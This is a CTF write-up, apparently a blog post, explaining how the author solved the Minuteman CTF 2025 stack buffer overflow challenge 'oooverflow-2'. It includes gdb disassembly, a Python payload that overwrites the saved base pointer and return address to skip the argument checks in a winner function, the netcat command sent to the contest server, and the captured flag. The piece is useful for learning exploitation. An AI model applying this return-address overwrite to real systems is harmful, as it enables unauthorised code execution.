---
name: minuteman-2025-oooverflow-2
title: minuteman ctf 2025 - oooverflow-2
number: 03
subtitle: writeup for a stack-based buffer overflow
date: 10/20/25
---
# Minuteman CTF 2025 Oooverflow-2
## Problem Overview
The main function in this problem is very simple - it is just printed out text with a prompt for a response that gets copied into a buffer. However, looking at the source code, we can see that theres's a super convenient function called `winner` that checks to see if both arguments `a = 0xcafebabe` and `b = deadbeef`. If they don't, the function returns.
## The Vulnerability
Just like the previous oooverflow challenge, `fgets` reads more than the buffer holds, this time, `fgets` reads 0x60 bytes and `buf` is a character array of 32 bytes, which allows for a user to overflow the buffer and rewrite some important registers, like the return value.
## The Solution
Just like last challenge, we need to see how much to overflow by, and what our stack looks like using the disassembly in gdb:
```x86asm
(gdb) disas main
Dump of assembler code for function main:
   0x00000000004019ca <+0>:     push   rbp
   0x00000000004019cb <+1>:     mov    rbp,rsp
   0x00000000004019ce <+4>:     sub    rsp,0x20
   0x00000000004019d2 <+8>:     lea    rax,[rip+0x91687]        # 0x493060
   0x00000000004019d9 <+15>:    mov    rdi,rax
   0x00000000004019dc <+18>:    mov    eax,0x0
   0x00000000004019e1 <+23>:    call   0x404ae0 <printf>
   0x00000000004019e6 <+28>:    lea    rax,[rip+0x916e3]        # 0x4930d0
   0x00000000004019ed <+35>:    mov    rdi,rax
   0x00000000004019f0 <+38>:    mov    eax,0x0
   0x00000000004019f5 <+43>:    call   0x404ae0 <printf>
   0x00000000004019fa <+48>:    lea    rax,[rip+0x916f7]        # 0x4930f8
   0x0000000000401a01 <+55>:    mov    rdi,rax
   0x0000000000401a04 <+58>:    call   0x413990 <puts>
   0x0000000000401a09 <+63>:    lea    rax,[rip+0x91750]        # 0x493160
   0x0000000000401a10 <+70>:    mov    rdi,rax
   0x0000000000401a13 <+73>:    mov    eax,0x0
   0x0000000000401a18 <+78>:    call   0x404ae0 <printf>
   0x0000000000401a1d <+83>:    mov    rdx,QWORD PTR [rip+0xbfcb4]        # 0x4c16d8 <stdin>
   0x0000000000401a24 <+90>:    lea    rax,[rbp-0x20]
   0x0000000000401a28 <+94>:    mov    esi,0x60
   0x0000000000401a2d <+99>:    mov    rdi,rax
   0x0000000000401a30 <+102>:   call   0x4134d0 <fgets>
   0x0000000000401a35 <+107>:   mov    eax,0x0
   0x0000000000401a3a <+112>:   leave
   0x0000000000401a3b <+113>:   ret
End of assembler dump.
```
At offset \<+4>, we see that the compiler moves rsp, the stack pointer, down by 0x20 to allocate space for the program. We can see our locals, which are located with negative offsets to the base pointer, rbp. In this program, we only have one at \<+90>, where our buffer is moved into the rax general purpose register.

Given this, our payload should be 0x20 bytes of junk to fill up that allocated buffer space. The next value moving up the stack is rbp, so let's overwrite that with junk*. Now, we can overwrite ret! The real question is, what should we set it to? Looking at the `winner` function, we could just call the function itself, but we don't have arguments set to `0xcafebabe` or `0xdeadbeef`. We probably could find some way to execute shellcode that does that or create a rop chain to do that, but instead, let's try something simpler - jumping past that! 
```x86asm
(gdb) disas winner
Dump of assembler code for function winner:
   0x0000000000401928 <+0>:     push   rbp
   0x0000000000401929 <+1>:     mov    rbp,rsp
   0x000000000040192c <+4>:     sub    rsp,0x60
   0x0000000000401930 <+8>:     mov    DWORD PTR [rbp-0x54],edi
   0x0000000000401933 <+11>:    mov    DWORD PTR [rbp-0x58],esi
   0x0000000000401936 <+14>:    cmp    DWORD PTR [rbp-0x54],0xcafebabe
   0x000000000040193d <+21>:    jne    0x4019c7 <winner+159>
   0x0000000000401943 <+27>:    cmp    DWORD PTR [rbp-0x58],0xdeadbeef
   0x000000000040194a <+34>:    jne    0x4019c7 <winner+159>
   0x000000000040194c <+36>:    lea    rax,[rip+0x916dd]        # 0x493030
   0x0000000000401953 <+43>:    mov    rsi,rax
   0x0000000000401956 <+46>:    lea    rax,[rip+0x916d5]        # 0x493032
   0x000000000040195d <+53>:    mov    rdi,rax
   0x0000000000401960 <+56>:    call   0x4137d0 <fopen64>
   0x0000000000401965 <+61>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401969 <+65>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x000000000040196e <+70>:    jne    0x40197f <winner+87>
   0x0000000000401970 <+72>:    lea    rax,[rip+0x916c4]        # 0x49303b
   0x0000000000401977 <+79>:    mov    rdi,rax
   0x000000000040197a <+82>:    call   0x413990 <puts>
   0x000000000040197f <+87>:    lea    rdx,[rbp-0x50]
   0x0000000000401983 <+91>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000401987 <+95>:    lea    rcx,[rip+0x916bd]        # 0x49304b
   0x000000000040198e <+102>:   mov    rsi,rcx
   0x0000000000401991 <+105>:   mov    rdi,rax
   0x0000000000401994 <+108>:   mov    eax,0x0
   0x0000000000401999 <+113>:   call   0x404a20 <__isoc99_fscanf>
   0x000000000040199e <+118>:   lea    rax,[rbp-0x50]
   0x00000000004019a2 <+122>:   mov    rsi,rax
   0x00000000004019a5 <+125>:   lea    rax,[rip+0x916a4]        # 0x493050
   0x00000000004019ac <+132>:   mov    rdi,rax
   0x00000000004019af <+135>:   mov    eax,0x0
   0x00000000004019b4 <+140>:   call   0x404ae0 <printf>
   0x00000000004019b9 <+145>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004019bd <+149>:   mov    rdi,rax
   0x00000000004019c0 <+152>:   call   0x413260 <fclose>
   0x00000000004019c5 <+157>:   jmp    0x4019c8 <winner+160>
   0x00000000004019c7 <+159>:   nop
   0x00000000004019c8 <+160>:   leave
   0x00000000004019c9 <+161>:   ret
End of assembler dump.
```
We can clearly see the values `0xcafebabe` and `0xdeadbeef` being compared, followed by a jump to the end of the program, causing it to exit immediately. The next instruction after those is at \<+36>, so let's try that! 
```python
import sys
import struct

winner = 0x401928
winner_no_checks = winner + 36

payload = b'A'*0x28 + struct.pack('<Q', winner_no_checks)

sys.stdout.buffer.write(payload)
```

```txt
Program received signal SIGBUS, Bus error.
0x401965 in winner ()
```
Okay, so that is not optimal. Let's look at what instruction is at 0x401965:
```x86asm
mov QWORD PTR [rbp-0x8], rax
```
Seems like some issue with referencing (namely, writing to) values relative to rbp. Since rbp references the calling function's rbp, maybe we shouldn't overwrite it with junk values! Let's set our junk to 0x20 bytes, and choose a random, writable, readable address to set rbp to in our payload (I chose 0x4c4000).
```python
import sys
import struct

winner = 0x401928
winner_no_checks = winner + 36

rbp = struct.pack("<Q", 0x4c4000)

payload = b'A'*0x20 + rbp + struct.pack('<Q', winner_no_checks)

sys.stdout.buffer.write(payload)
```
And...
```txt
-> oooverflow2 python3 sol.py | nc pwn.minuteman.umasscybersec.org 9123
My name is Key-per, and duly so, for I carry the key to this door, 
but all is not how it appears, you see.
Or perhaps you do not see at all. 
Perhaps the key is in you, child, but you cannot use your brawn here. 
The door is magically sealed.

Enter your response challenger: 
Congrats!

MINUTEMAN{1_th0ught_y0u'd_l00k_cut3_5tuff3d_1n_th4t_l0ck_ccd0341c5a6e8}
```
Interesting flag, but we got it!